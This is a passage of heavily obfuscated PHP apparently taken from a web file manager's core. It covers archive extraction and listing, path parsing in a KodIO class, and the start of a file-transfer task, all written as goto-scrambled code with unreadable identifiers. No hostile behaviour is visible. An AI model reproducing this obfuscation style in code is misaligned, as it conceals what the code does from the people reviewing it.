!1); } if (!($A¢İÍë = parent::infoFull($eÎ­áêà¸š))) { $eÎ­áêà¸š = parent::mkdir($eÎ­áêà¸š); $A¢İÍë = array($D –ÑËğÖ’[75] => $eÎ­áêà¸š); } else { if (isset($A¢İÍë[$D –ÑËğÖ’[369]]) && trim($A¢İÍë[$D –ÑËğÖ’[75]], $D –ÑËğÖ’[8]) != trim($eÎ­áêà¸š, $D –ÑËğÖ’[8])) { $D‡éê†¹ÆŠ = KodIO::make($A¢İÍë[$D –ÑËğÖ’[461]]); $Aóïä—ê¤¥ = parent::fileNameAuto($D‡éê†¹ÆŠ, $A¢İÍë[$D –ÑËğÖ’[28]], REPEAT_RENAME_FOLDER, !0); $eÎ­áêà¸š = parent::mkdir($D‡éê†¹ÆŠ . $Aóïä—ê¤¥); $A¢İÍë = array($D –ÑËğÖ’[75] => $eÎ­áêà¸š); } } $eÎ­áêà¸š = $A¢İÍë[$D –ÑËğÖ’[75]]; goto C™œ›‡…¨„; eÈÙ­Å©˜Ê: Hook::trigger($D –ÑËğÖ’[1044], $AöÃ«â° ²); recursion_dir($AöÃ«â° ², $BÇ¸ËÏõóÖ, $fÃ¹ŸÛõß, 0); $aõ¢²¤²£ = array_merge($BÇ¸ËÏõóÖ, $fÃ¹ŸÛõß); goto DÅ‡‹öÆèë; DØ¶µ½ê Ó: mk_dir($AöÃ«â° ²); $BŒéŞ¥µîÖ = self::fileExt($Eæ©Ñ©); $FÅé¦ï“á… = $AöÃ«â° ² . $D –ÑËğÖ’[91] . $BŒéŞ¥µîÖ; goto eèá¬ç½Ô; fÅ†Ë‘©÷Ğ: $BÄÙØ’Ê˜È = KodArchive::extract($FÅé¦ï“á…, $AöÃ«â° ² . $D –ÑËğÖ’[8], $a‡ÉëùÙõ); self::archiveExt(); if (!$BÄÙØ’Ê˜È[$D –ÑËğÖ’[1041]]) { show_json($D –ÑËğÖ’[1042] . $BÄÙØ’Ê˜È[$D –ÑËğÖ’[1043]], !1); } goto eÈÙ­Å©˜Ê; D¨ÃÛëÜ¦¡: } public static function unzipList($D—£ğÅË³) { goto CùªÌÆ‚ò°; A¤±©ó…Û„: self::archiveExt(); del_dir($DÅãŒ†¼Šê); if (!$EñÅ££Ë‚[$F›ï©ä”º[1041]]) { show_json($EñÅ££Ë‚[$F›ï©ä”º[1043]], !1); } goto E¯º¡ñ˜¶İ; bäÑë±É‰¾: if (isset($CÎØÍ¥Ô©)) { $Aƒğ¢±½ƒ = array($CÎØÍ¥Ô©[$F›ï©ä”º[75]], $CÎØÍ¥Ô©[$F›ï©ä”º[1045]], $CÎØÍ¥Ô©[$F›ï©ä”º[28]]); $bËÂÎ¡«¡ = md5(implode($F›ï©ä”º[70], $Aƒğ¢±½ƒ)) . $F›ï©ä”º[91] . get_path_ext($CÎØÍ¥Ô©[$F›ï©ä”º[28]]); } else { $Aƒğ¢±½ƒ = array($dñ ã‰‡ëĞ[$F›ï©ä”º[28]], $dñ ã‰‡ëĞ[$F›ï©ä”º[75]], $dñ ã‰‡ëĞ[$F›ï©ä”º[77]]); $bËÂÎ¡«¡ = md5(implode($F›ï©ä”º[70], $Aƒğ¢±½ƒ)) . $F›ï©ä”º[91] . $a©†óÔŒäµ; } if ($Aî”¬Ìğ¬ˆ == -1) { $Aœ÷ìèªÙ = IO_PATH_SYSTEM_TEMP . "\172\151\160\x56\151\145\x77\x2f{$FÄ­ï¾Îì}\57{$bËÂÎ¡«¡}\x2e\154\157\147"; $fÅàÌÑ» = self::infoFull($Aœ÷ìèªÙ); if ($fÅàÌÑ») { $Aœ÷ìèªÙ = $fÅàÌÑ»[$F›ï©ä”º[75]]; $B…šñ•«ß = self::getContent($Aœ÷ìèªÙ); if ($B…šñ•«ß) { $aÇë· ëÆ = json_decode($B…šñ•«ß, !0); if (count($aÇë· ëÆ) >= $BèÅ¢£Ú££) { show_json(sprintf(LNG($F›ï©ä”º[1047]), count($aÇë· ëÆ)), !1); } return $aÇë· ëÆ; } } else { $Aœ÷ìèªÙ = self::mkfile($Aœ÷ìèªÙ); } } $DÅãŒ†¼Šê = TEMP_FILES . $FÄ­ï¾Îì; goto c«æÒÔ²Œ; c«æÒÔ²Œ: if (!is_dir($DÅãŒ†¼Šê)) { mk_dir($DÅãŒ†¼Šê); } $Báî›îËÃÃ = $DÅãŒ†¼Šê . $F›ï©ä”º[8] . $bËÂÎ¡«¡; if (!@file_exists(self::iconvSystem($Báî›îËÃÃ))) { if (isset($CÎØÍ¥Ô©)) { url_request($aì…ñÏ¯Ü§, $F›ï©ä”º[1048], $Báî›îËÃÃ); } else { $dÑÄ¯•“¯ = self::localFilePath($aì…ñÏ¯Ü§, $a©†óÔŒäµ); $Báî›îËÃÃ = $dÑÄ¯•“¯ ? $dÑÄ¯•“¯ : self::download($aì…ñÏ¯Ü§, $Báî›îËÃÃ); } } goto a¨é„¾»æ­; bòè×ÚÁ•Ë: return $EñÅ££Ë‚[$F›ï©ä”º[1043]]; goto E™¦â¬çÉ; C¤È¸Ãâ «: $dñ ã‰‡ëĞ = self::info($A´Õ™Áµ”ª); $a©†óÔŒäµ = self::fileExt($dñ ã‰‡ëĞ); $FÄ­ï¾Îì = self::tmpFileName($dñ ã‰‡ëĞ); goto bäÑë±É‰¾; B®Ÿœ›ë‘„: $BèÅ¢£Ú££ = 50000; if (request_url_safe($aì…ñÏ¯Ü§)) { $CÎØÍ¥Ô© = parse_url_query($aì…ñÏ¯Ü§); if (!isset($CÎØÍ¥Ô©[$F›ï©ä”º[75]])) { show_json($F›ï©ä”º[1046], !1); } } $A´Õ™Áµ”ª = isset($CÎØÍ¥Ô©) ? $CÎØÍ¥Ô©[$F›ï©ä”º[75]] : $aì…ñÏ¯Ü§; goto C¤È¸Ãâ «; a¨é„¾»æ­: $Báî›îËÃÃ = self::iconvSystem($Báî›îËÃÃ); if ($Aî”¬Ìğ¬ˆ >= 0) { $E—Ÿäö­À‹ = isset($D—£ğÅË³[$F›ï©ä”º[1049]]) ? $D—£ğÅË³[$F›ï©ä”º[1049]] : !1; $Aò²•ß±‡ = isset($D—£ğÅË³[$F›ï©ä”º[28]]) ? $D—£ğÅË³[$F›ï©ä”º[28]] : $F›ï©ä”º[33]; KodArchive::filePreview($Báî›îËÃÃ, $Aî”¬Ìğ¬ˆ, $E—Ÿäö­À‹, $Aò²•ß±‡); self::archiveExt(); die; } $EñÅ££Ë‚ = KodArchive::listContent($Báî›îËÃÃ); goto A¤±©ó…Û„; CùªÌÆ‚ò°: $F›ï©ä”º =& $_SERVER[¯Ò¬Èè]; $aì…ñÏ¯Ü§ = $D—£ğÅË³[$F›ï©ä”º[75]]; $Aî”¬Ìğ¬ˆ = isset($D—£ğÅË³[$F›ï©ä”º[1045]]) ? $D—£ğÅË³[$F›ï©ä”º[1045]] : -1; goto B®Ÿœ›ë‘„; E¯º¡ñ˜¶İ: $aÇë· ëÆ = json_encode($EñÅ££Ë‚[$F›ï©ä”º[1043]]); self::setContent($Aœ÷ìèªÙ, $aÇë· ëÆ); if (count($EñÅ££Ë‚[$F›ï©ä”º[1043]]) >= $BèÅ¢£Ú££) { show_json(sprintf(LNG($F›ï©ä”º[1047]), count($EñÅ££Ë‚[$F›ï©ä”º[1043]])), !1); } goto bòè×ÚÁ•Ë; E™¦â¬çÉ: } private static function fileExt($FÕğÑ÷Ä¨‚) { $eóµí½×Ó… =& $_SERVER[¯Ò¬Èè]; $BÒ²Œ§ß”è = $FÕğÑ÷Ä¨‚[$eóµí½×Ó…[160]]; if ($BÒ²Œ§ß”è == $eóµí½×Ó…[1050]) { $Eˆ¢ÊÔ³£ = $eóµí½×Ó…[1051]; if (substr($FÕğÑ÷Ä¨‚[$eóµí½×Ó…[28]], -strlen($Eˆ¢ÊÔ³£)) == $Eˆ¢ÊÔ³£) { $BÒ²Œ§ß”è = $eóµí½×Ó…[1052]; } } self::archiveExt($BÒ²Œ§ß”è); return $BÒ²Œ§ß”è; } private static function zipFileList($cØªòƒòŠ, $DŞõ±éë‘ˆ = false) { $AÖÑØÌ‹ó =& $_SERVER[¯Ò¬Èè]; $aƒ¼‡•Œ— = array(); foreach ($cØªòƒòŠ as $cí½É§¼ŒŒ) { $C‹ƒœî­‰ = $cí½É§¼ŒŒ[$AÖÑØÌ‹ó[75]]; if ($DŞõ±éë‘ˆ) { $C‹ƒœî­‰ = self::copy($cí½É§¼ŒŒ[$AÖÑØÌ‹ó[75]], $DŞõ±éë‘ˆ, $AÖÑØÌ‹ó[759]); } if ($C‹ƒœî­‰ && self::local()->exist($C‹ƒœî­‰)) { $aƒ¼‡•Œ—[$cí½É§¼ŒŒ[$AÖÑØÌ‹ó[75]]] = $C‹ƒœî­‰; } } if (!empty($aƒ¼‡•Œ—)) { return array_values($aƒ¼‡•Œ—); } show_json(LNG($AÖÑØÌ‹ó[1053]), !1); } public static function tmpFileName($fËÛé›˜¸) { $aì«æ„ëÃ =& $_SERVER[¯Ò¬Èè]; $BîöÌ²– = array($fËÛé›˜¸[$aì«æ„ëÃ[28]], $fËÛé›˜¸[$aì«æ„ëÃ[75]], $fËÛé›˜¸[$aì«æ„ëÃ[77]], $fËÛé›˜¸[$aì«æ„ëÃ[459]]); return md5(implode($aì«æ„ëÃ[70], $BîöÌ²–)); } private static function localFilePath($A‘ÕÊ×ƒÛò, $b›œó¶æï) { goto c†©÷®ï”„; c†©÷®ï”„: $f¨‹ÓƒË‘é =& $_SERVER[¯Ò¬Èè]; if ($b›œó¶æï == $f¨‹ÓƒË‘é[1054] && strtoupper(substr(PHP_OS, 0, 3)) == $f¨‹ÓƒË‘é[1055]) { return !1; } $EÕ¦¨ä¤„Ç = KodIO::parse($A‘ÕÊ×ƒÛò); goto EóÒàÄ²£; EóÒàÄ²£: if ($EÕ¦¨ä¤„Ç[$f¨‹ÓƒË‘é[29]] == KodIO::KOD_SOURCE) { $EÚáˆ©¬ŒØ = Model($f¨‹ÓƒË‘é[767])->fileInfoGet(KodIO::sourceID($A‘ÕÊ×ƒÛò)); if (!$EÚáˆ©¬ŒØ[$f¨‹ÓƒË‘é[75]]) { show_json($f¨‹ÓƒË‘é[1056], !1); } $A‘ÕÊ×ƒÛò = $EÚáˆ©¬ŒØ[$f¨‹ÓƒË‘é[75]]; } $a¡‹Øğ†¾Ô = self::init($A‘ÕÊ×ƒÛò); $B‹‹âÄÉğ– = $a¡‹Øğ†¾Ô->getType(); goto dŠ™»Âèàâ; dŠ™»Âèàâ: if ($B‹‹âÄÉğ– == $f¨‹ÓƒË‘é[102] || $B‹‹âÄÉğ– == $f¨‹ÓƒË‘é[1057]) { if (!$a¡‹Øğ†¾Ô->exist($a¡‹Øğ†¾Ô->path)) { show_json(LNG($f¨‹ÓƒË‘é[101]), !1); } return $a¡‹Øğ†¾Ô->path; } return !1; goto b‹†§­©Ìˆ; b‹†§­©Ìˆ: } private static function archiveExt($AƒÌÖŠ ÖĞ = '') { $GLOBALS[$_SERVER[¯Ò¬Èè][1058]] = $AƒÌÖŠ ÖĞ; } } class KodIO { const KOD_SOURCE = "\x7b\x73\157\x75\x72\143\145\175"; const KOD_USER_RECYCLE = "\x7b\x75\163\145\x72\122\145\x63\171\x63\154\145\x7d"; const KOD_USER_FAV = "\173\x75\x73\145\162\106\x61\x76\175"; const KOD_USER_FILE_TAG = "\173\x75\x73\x65\x72\x46\x69\154\145\124\141\x67\175"; const KOD_USER_FILE_TYPE = "\173\165\163\145\x72\106\151\x6c\x65\x54\171\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\173\147\x72\x6f\165\x70\122\157\157\x74\x53\x65\154\146\175"; const KOD_USER_SHARE = "\173\165\x73\x65\162\x53\x68\141\162\x65\175"; const KOD_USER_SHARE_LINK = "\173\165\x73\x65\162\123\x68\141\162\x65\x4c\151\156\153\175"; const KOD_USER_SHARE_TO_ME = "\173\163\x68\x61\x72\145\x54\157\x4d\x65\175"; const KOD_SHARE_ITEM = "\173\163\x68\141\162\145\x49\x74\x65\155\x7d"; const KOD_SHARE_LINK = "\173\x73\x68\x61\x72\x65\111\164\x65\x6d\x4c\x69\156\153\x7d"; const KOD_SEARCH = "\x7b\x73\x65\141\162\x63\150\175"; const KOD_BLOCK = "\x7b\x62\154\157\143\153\175"; const KOD_IO = "\173\x69\x6f\x7d"; const KOD_USER_RECENT = "\173\165\x73\x65\162\122\145\156\143\145\x6e\x74\175"; const KOD_USER_DRIVER = "\x7b\144\x72\151\166\x65\162\175"; public static function typeList() { $d‘¹–ØŒé =& $_SERVER[¯Ò¬Èè]; return array($d‘¹–ØŒé[1059] => self::KOD_SOURCE, $d‘¹–ØŒé[1060] => self::KOD_USER_RECYCLE, $d‘¹–ØŒé[1061] => self::KOD_USER_FAV, $d‘¹–ØŒé[1062] => self::KOD_USER_FILE_TAG, $d‘¹–ØŒé[1063] => self::KOD_USER_FILE_TYPE, $d‘¹–ØŒé[1064] => self::KOD_GROUP_ROOT_SELF, $d‘¹–ØŒé[1065] => self::KOD_USER_SHARE, $d‘¹–ØŒé[1066] => self::KOD_USER_SHARE_LINK, $d‘¹–ØŒé[1067] => self::KOD_USER_SHARE_TO_ME, $d‘¹–ØŒé[1068] => self::KOD_SHARE_ITEM, $d‘¹–ØŒé[1069] => self::KOD_SHARE_LINK, $d‘¹–ØŒé[1070] => self::KOD_SEARCH, $d‘¹–ØŒé[1071] => self::KOD_BLOCK, $d‘¹–ØŒé[1072] => self::KOD_IO, $d‘¹–ØŒé[1073] => self::KOD_USER_RECENT, $d‘¹–ØŒé[1074] => self::KOD_USER_DRIVER); } public static function parse($eëÇ¯Æ°ò) { goto DŞ•ª©Ã¿¤; A÷°·åÈÁÂ: $cµŠøøˆ¹ = array($C›ö×Ÿ „†[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $C­øñßºº[$C›ö×Ÿ „†[1079]] = in_array($C­øñßºº[$C›ö×Ÿ „†[29]], $cµŠøøˆ¹); return $C­øñßºº; goto a°Ê¥±½Êä; DŞ•ª©Ã¿¤: $C›ö×Ÿ „† =& $_SERVER[¯Ò¬Èè]; $eëÇ¯Æ°ò = self::clear($eëÇ¯Æ°ò); $eæßõê°ºõ = array_values(self::typeList()); goto b‰ØŞ¬®ÏÊ; b‰ØŞ¬®ÏÊ: preg_match($C›ö×Ÿ „†[1075], $eëÇ¯Æ°ò, $d†ŠçßÌÈõ); $C­øñßºº = array($C›ö×Ÿ „†[388] => !1, $C›ö×Ÿ „†[1076] => !1, $C›ö×Ÿ „†[385] => !1, $C›ö×Ÿ „†[75] => $eëÇ¯Æ°ò, $C›ö×Ÿ „†[1022] => !1, $C›ö×Ÿ „†[1021] => $C›ö×Ÿ „†[33]); if (is_array($d†ŠçßÌÈõ) && count($d†ŠçßÌÈõ) == 5) { $eÈ¾—Œ’Æœ = $C›ö×Ÿ „†[1077] . $d†ŠçßÌÈõ[2] . $C›ö×Ÿ „†[315]; if (in_array($eÈ¾—Œ’Æœ, $eæßõê°ºõ)) { $C­øñßºº[$C›ö×Ÿ „†[1022]] = $d†ŠçßÌÈõ[1]; $C­øñßºº[$C›ö×Ÿ „†[29]] = $eÈ¾—Œ’Æœ; $C­øñßºº[$C›ö×Ÿ „†[1078]] = substr($eÈ¾—Œ’Æœ, 1, -1); $C­øñßºº[$C›ö×Ÿ „†[367]] = $d†ŠçßÌÈõ[3]; } $C­øñßºº[$C›ö×Ÿ „†[1021]] = $d†ŠçßÌÈõ[4]; } goto A÷°·åÈÁÂ; a°Ê¥±½Êä: } public static function clear($b¥Ë¼Ö¶ö) { goto CÏçè¼³Íã; d„·¾¡‰‚: return $b¥Ë¼Ö¶ö; goto B²ê‡¦æŸÀ; bŒªİñ…Ê¾: $b¥Ë¼Ö¶ö = preg_replace($c ÷ğÚåöÇ[1082], $c ÷ğÚåöÇ[8], $b¥Ë¼Ö¶ö); if ($b¥Ë¼Ö¶ö == $c ÷ğÚåöÇ[8]) { return $c ÷ğÚåöÇ[8]; } $b¥Ë¼Ö¶ö = rtrim($b¥Ë¼Ö¶ö, $c ÷ğÚåöÇ[8]); goto d„·¾¡‰‚; dŸŒ·ÄĞ‡: $AÍ´®–í×Ö = $c ÷ğÚåöÇ[1080]; if (substr($b¥Ë¼Ö¶ö, 0, 3) == $c ÷ğÚåöÇ[1081]) { $b¥Ë¼Ö¶ö = substr($b¥Ë¼Ö¶ö, 3); } while (strstr($b¥Ë¼Ö¶ö, $AÍ´®–í×Ö)) { $b¥Ë¼Ö¶ö = str_replace($AÍ´®–í×Ö, $c ÷ğÚåöÇ[8], $b¥Ë¼Ö¶ö); } goto bŒªİñ…Ê¾; CÏçè¼³Íã: $c ÷ğÚåöÇ =& $_SERVER[¯Ò¬Èè]; $b¥Ë¼Ö¶ö = str_replace(array($c ÷ğÚåöÇ[1001], $c ÷ğÚåöÇ[217]), $c ÷ğÚåöÇ[50], $b¥Ë¼Ö¶ö); $b¥Ë¼Ö¶ö = str_replace($c ÷ğÚåöÇ[93], $c ÷ğÚåöÇ[8], $b¥Ë¼Ö¶ö); goto dŸŒ·ÄĞ‡; B²ê‡¦æŸÀ: } public static function sourceID($B®ÆÕ¼âôÅ) { $C¶¹„¤¿Á =& $_SERVER[¯Ò¬Èè]; $añØİ‚âÀˆ = self::parse($B®ÆÕ¼âôÅ); if ($añØİ‚âÀˆ[$C¶¹„¤¿Á[29]] !== self::KOD_SOURCE) { show_json(LNG($C¶¹„¤¿Á[1083]), !1); } return $añØİ‚âÀˆ[$C¶¹„¤¿Á[367]]; } public static function make($D—¶ìğˆ‡¥) { if (!$D—¶ìğˆ‡¥) { return !1; } return self::makePath(self::KOD_SOURCE, intval($D—¶ìğˆ‡¥)); } public static function makeShare($Fš…‚âÑÚ, $EÊ•²†¹˜™) { return self::makePath(self::KOD_SHARE_ITEM, $Fš…‚âÑÚ, $EÊ•²†¹˜™); } public static function makeFileTypePath($bÀì‘ëÖ’) { return self::makePath(self::KOD_USER_FILE_TYPE, $bÀì‘ëÖ’); } public static function makeFileTagPath($d±ƒô¶›ÂÎ) { return self::makePath(self::KOD_USER_FILE_TAG, $d±ƒô¶›ÂÎ); } public static function makePath($AÍğ£ÀÎ‘”, $A±ñ‹—¬È¸ = '', $b îŠ›Œô = '') { $b„½æñù† =& $_SERVER[¯Ò¬Èè]; $fî¨ÔÒÔƒ¯ = substr($AÍğ£ÀÎ‘”, 1, -1); $b‰‰ËÓ˜¹Ó = $b„½æñù†[1084] . $fî¨ÔÒÔƒ¯ . $b„½æñù†[1085] . $A±ñ‹—¬È¸ . $b„½æñù†[1086]; $b‰‰ËÓ˜¹Ó = $b îŠ›Œô ? $b‰‰ËÓ˜¹Ó . $b îŠ›Œô . $b„½æñù†[8] : $b‰‰ËÓ˜¹Ó; return $b‰‰ËÓ˜¹Ó; } public static function hashPath($FÃÄçÈôÙù) { $dœÇáÏÑÖ‡ =& $_SERVER[¯Ò¬Èè]; $FŒ‰ÁÂ­ÕŒ = is_array($FÃÄçÈôÙù) ? $FÃÄçÈôÙù : IO::info($FÃÄçÈôÙù); $E¥Ùâø˜ = _get($FŒ‰ÁÂ­ÕŒ, $dœÇáÏÑÖ‡[1087], $dœÇáÏÑÖ‡[33]); if (!$E¥Ùâø˜) { $b‚‚õ‰Ë”± = KodIO::parse($FŒ‰ÁÂ­ÕŒ[$dœÇáÏÑÖ‡[75]]); if (!$b‚‚õ‰Ë”±[$dœÇáÏÑÖ‡[29]]) { $E¥Ùâø˜ = IO::hashSimple($FŒ‰ÁÂ­ÕŒ[$dœÇáÏÑÖ‡[75]]); } } if (!$E¥Ùâø˜) { $E¥Ùâø˜ = md5($FŒ‰ÁÂ­ÕŒ[$dœÇáÏÑÖ‡[75]] . $FŒ‰ÁÂ­ÕŒ[$dœÇáÏÑÖ‡[77]] . $FŒ‰ÁÂ­ÕŒ[$dœÇáÏÑÖ‡[107]]); } return $E¥Ùâø˜; } public static function initSystemPath() { $BÁ–‹¼ø =& $_SERVER[¯Ò¬Èè]; if (defined($BÁ–‹¼ø[1088])) { return; } define($BÁ–‹¼ø[1088], self::systemPath($BÁ–‹¼ø[1089])); define($BÁ–‹¼ø[1090], self::systemPath($BÁ–‹¼ø[1091])); define($BÁ–‹¼ø[1092], self::systemPath($BÁ–‹¼ø[1093])); define($BÁ–‹¼ø[1094], self::systemPath($BÁ–‹¼ø[1095])); } private static function systemPath($b÷ø™˜°å») { goto cÇÓ›¼Šï¬; cÇÓ›¼Šï¬: $F”…à£åÑ =& $_SERVER[¯Ò¬Èè]; $fŸ­š¬Ã–© = $F”…à£åÑ[1096] . ucfirst($b÷ø™˜°å»); $Cç¨š¶ŒèÅ = Model($F”…à£åÑ[1097])->get($fŸ­š¬Ã–©); goto e¯¾¼®¯‹™; e¯¾¼®¯‹™: if ($Cç¨š¶ŒèÅ) { return $Cç¨š¶ŒèÅ; } if ($b÷ø™˜°å» == $F”…à£åÑ[1089]) { $Cç¨š¶ŒèÅ = self::make(Model($F”…à£åÑ[767])->systemRootPathAdd($F”…à£åÑ[1098])); } else { $Cç¨š¶ŒèÅ = self::systemPath($F”…à£åÑ[1089]); $BĞô¥»Øœ = self::sourceID($Cç¨š¶ŒèÅ); $Cç¨š¶ŒèÅ = self::make(Model($F”…à£åÑ[767])->mkdir($BĞô¥»Øœ, $b÷ø™˜°å»)); } Model($F”…à£åÑ[1097])->set($fŸ­š¬Ã–©, $Cç¨š¶ŒèÅ); goto fİëÍ«À¥ˆ; fİëÍ«À¥ˆ: return $Cç¨š¶ŒèÅ; goto aÈËœĞ½ğ¦; aÈËœĞ½ğ¦: } public static function systemFolder($D½âÍšÏƒ) { $FŒœ®²´ÚË = IO_PATH_SYSTEM_SOURCE . $D½âÍšÏƒ; $fä³‘¸·•« = Cache::get($FŒœ®²´ÚË); if (!$fä³‘¸·•«) { $fƒğ›á— = IO::infoFull($FŒœ®²´ÚË); if (!$fƒğ›á—) { $fä³‘¸·•« = IO::mkdir($FŒœ®²´ÚË, REPEAT_SKIP); } else { $fä³‘¸·•« = $fƒğ›á—[$_SERVER[¯Ò¬Èè][75]]; } Cache::set($FŒœ®²´ÚË, $fä³‘¸·•«, 3600 * 10); } return $fä³‘¸·•«; } public static function defaultDriver() { return Model($_SERVER[¯Ò¬Èè][718])->defaultDriver(); } public static function defaultIO() { $d¾Ï ¥éØÄ =& $_SERVER[¯Ò¬Èè]; $EâË­óé… = self::defaultDriver(); return $d¾Ï ¥éØÄ[1099] . $EâË­óé…[$d¾Ï ¥éØÄ[367]] . $d¾Ï ¥éØÄ[1086]; } public static function defaultDriverInit() { static $dÒŠ¶ÌÚ…ê = false; if ($dÒŠ¶ÌÚ…ê) { return $dÒŠ¶ÌÚ…ê; } $dÒŠ¶ÌÚ…ê = IO::init(self::defaultIO()); return $dÒŠ¶ÌÚ…ê; } public static function fileTypeList() { $Dù·•ñæÜ =& $_SERVER[¯Ò¬Èè]; $b‰ß§é¨é = $GLOBALS[$Dù·•ñæÜ[6]][$Dù·•ñæÜ[1100]]; foreach ($b‰ß§é¨é as $d•Ø¼ÒÎ¡ => $A‡ÚŞíø¿) { $b‚…½‰ø’é = $Dù·•ñæÜ[1101] . $d•Ø¼ÒÎ¡; $a§Â‡Åë¤§ = LNG($b‚…½‰ø’é); if ($b‚…½‰ø’é != $a§Â‡Åë¤§) { $b‰ß§é¨é[$d•Ø¼ÒÎ¡][$Dù·•ñæÜ[28]] = $a§Â‡Åë¤§; } } return $b‰ß§é¨é; } public static function transferType($d¼½Ö«°æâ, $Bõ¹ÉÛ–«ó) { goto f«‚µß¦¹†; eƒ§Ê–­ : if ($Dâôö®ô±[$dÄ‘Ñ²Æ[29]] == $fÙê‰ø¸½[$dÄ‘Ñ²Æ[29]] && $Dâôö®ô±[$dÄ‘Ñ²Æ[1102]] == $fÙê‰ø¸½[$dÄ‘Ñ²Æ[1102]]) { return $dÄ‘Ñ²Æ[1103]; } if ($Dâôö®ô±[$dÄ‘Ñ²Æ[29]] == $dÄ‘Ñ²Æ[794] && $fÙê‰ø¸½[$dÄ‘Ñ²Æ[29]] == $dÄ‘Ñ²Æ[102]) { return $dÄ‘Ñ²Æ[1049]; } if ($Dâôö®ô±[$dÄ‘Ñ²Æ[29]] == $dÄ‘Ñ²Æ[102] && $fÙê‰ø¸½[$dÄ‘Ñ²Æ[29]] == $dÄ‘Ñ²Æ[794]) { return $dÄ‘Ñ²Æ[103]; } goto b•ŸŸÀ”Üâ; b•ŸŸÀ”Üâ: return $dÄ‘Ñ²Æ[1104]; goto DÃìä¬Ÿ¿; f«‚µß¦¹†: $dÄ‘Ñ²Æ =& $_SERVER[¯Ò¬Èè]; $Dâôö®ô± = self::driverType($d¼½Ö«°æâ); $fÙê‰ø¸½ = self::driverType($Bõ¹ÉÛ–«ó); goto eƒ§Ê–­ ; DÃìä¬Ÿ¿: } public static function driverType($b‡ÙÉùë®ß) { goto bç¡ÍÈˆÙ; E†‰ööƒÌ§: return array($Eæ÷‚ó¯…ñ[29] => $Eæ÷‚ó¯…ñ[794], $Eæ÷‚ó¯…ñ[1102] => $b‡ÙÉùë®ß->pathDriver, $Eæ÷‚ó¯…ñ[75] => $fàõºà’®); goto Dòõ¸÷ó­®; bç¡ÍÈˆÙ: $Eæ÷‚ó¯…ñ =& $_SERVER[¯Ò¬Èè]; $fàõºà’® = $b‡ÙÉùë®ß->path; $a³ê ¾ˆ²Ë = str_replace($Eæ÷‚ó¯…ñ[1105], $Eæ÷‚ó¯…ñ[33], strtolower($b‡ÙÉùë®ß->getType())); goto A´Ï¥‰Ğ‹À; A´Ï¥‰Ğ‹À: if ($a³ê ¾ˆ²Ë == $Eæ÷‚ó¯…ñ[708] || $a³ê ¾ˆ²Ë == $Eæ÷‚ó¯…ñ[1106] || $a³ê ¾ˆ²Ë == $Eæ÷‚ó¯…ñ[1107]) { $b‡ÙÉùë®ß = self::defaultDriverInit(); } else { if ($a³ê ¾ˆ²Ë == $Eæ÷‚ó¯…ñ[1057] || $a³ê ¾ˆ²Ë == $Eæ÷‚ó¯…ñ[1108]) { $b‡ÙÉùë®ß = IO::init($b‡ÙÉùë®ß->pathParse[$Eæ÷‚ó¯…ñ[1007]]); } } $a³ê ¾ˆ²Ë = str_replace($Eæ÷‚ó¯…ñ[1105], $Eæ÷‚ó¯…ñ[33], strtolower($b‡ÙÉùë®ß->getType())); if ($a³ê ¾ˆ²Ë == $Eæ÷‚ó¯…ñ[102]) { return array($Eæ÷‚ó¯…ñ[29] => $Eæ÷‚ó¯…ñ[102], $Eæ÷‚ó¯…ñ[1102] => $Eæ÷‚ó¯…ñ[33], $Eæ÷‚ó¯…ñ[75] => $fàõºà’®); } goto E†‰ööƒÌ§; Dòõ¸÷ó­®: } } goto A ‹®Äí’; bˆ¥…«½¤Õ: class TaskFileTransfer extends Task { protected function startAfter() { goto bò«ñ˜³…; EˆÈŒ“Î…Ô: $dœÛñ‚´ñÊ[$eçå¤Ã„ã[987]] = $eçå¤Ã„ã[33]; $dœÛñ‚´ñÊ[$eçå¤Ã„ã[1493]] = $eçå¤Ã„ã[33]; $dœÛñ‚´ñÊ[$eçå¤Ã„ã[1494]] = 0; goto a‰‘¢ê‘ì‹; fóøÓØ¨: Hook::bind($eçå¤Ã„ã[552], array($this, $eçå¤Ã„ã[1478])); Hook::bind($eçå¤Ã„ã[518], array($this, $eçå¤Ã„ã[1479])); Hook::bind($eçå¤Ã„ã[515], array($this, $eçå¤Ã„ã[1479])); goto DŠÁ»ß‹ŠÇ; Bôâ÷ÙÄ…—: Hook::bind($eçå¤Ã„ã[1483], array($this, $eçå¤Ã„ã[1484])); Hook::bind($eçå¤Ã„ã[1485], array($this, $eçå¤Ã„ã[1486])); Hook::bind($eçå¤Ã„ã[1487], array($this, $eçå¤Ã„ã[1488])); goto d”ÏêæÅ…Ã; aÍÙ¨ÅÕóÕ: Hook::bind($eçå¤Ã„ã[1480], array($this, $eçå¤Ã„ã[1481])); Hook::bind($eçå¤Ã„ã[541], array($this, $eçå¤Ã„ã[1482])); $this->sourceModelCopyFlag = !1; goto Bôâ÷ÙÄ…—; EÙÀÓËê½: Hook::bind($eçå¤Ã„ã[1470], array($this, $eçå¤Ã„ã[1471])); Hook::bind($eçå¤Ã„ã[1472], array($this, $eçå¤Ã„ã[1473])); Hook::bind($eçå¤Ã„ã[1474], array($this, $eçå¤Ã„ã[1475])); goto C÷ğòˆáÍ; a‰‘¢ê‘ì‹: $dœÛñ‚´ñÊ[$eçå¤Ã„ã[1495]] = 0; $dœÛñ‚´ñÊ[$eçå¤Ã„ã[1496]] = 0; if (!$dœÛñ‚´ñÊ[$eçå¤Ã„ã[1352]]) { $dœÛñ‚´ñÊ[$eçå¤Ã„ã[1352]] = LNG($eçå¤Ã„ã[1497]); } goto f÷š“ƒöî; d”ÏêæÅ…Ã: $dœÛñ‚´ñÊ[$eçå¤Ã„ã[1489]] = LNG($eçå¤Ã„ã[1490]); $dœÛñ‚´ñÊ[$eçå¤Ã„ã[1491]] = 0; $dœÛñ‚´ñÊ[$eçå¤Ã„ã[1492]] = 0; goto EˆÈŒ“Î…Ô; bò«ñ˜³…: $eçå¤Ã„ã =& $_SERVER[¯Ò¬Èè]; $dœÛñ‚´ñÊ =& $this->task; $this->sourceCopyFolder = !1; goto EÙÀÓËê½; DŠÁ»ß‹ŠÇ: Hook::bind($eçå¤Ã„ã[520], array($this, $eçå¤Ã„ã[1479])); Hook::bind($eçå¤Ã„ã[522], array($this, $eçå¤Ã„ã[1479])); Hook::bind($eçå¤Ã„ã[524], array($this, $eçå¤Ã„ã[1479])); goto aÍÙ¨ÅÕóÕ; C÷ğòˆáÍ: 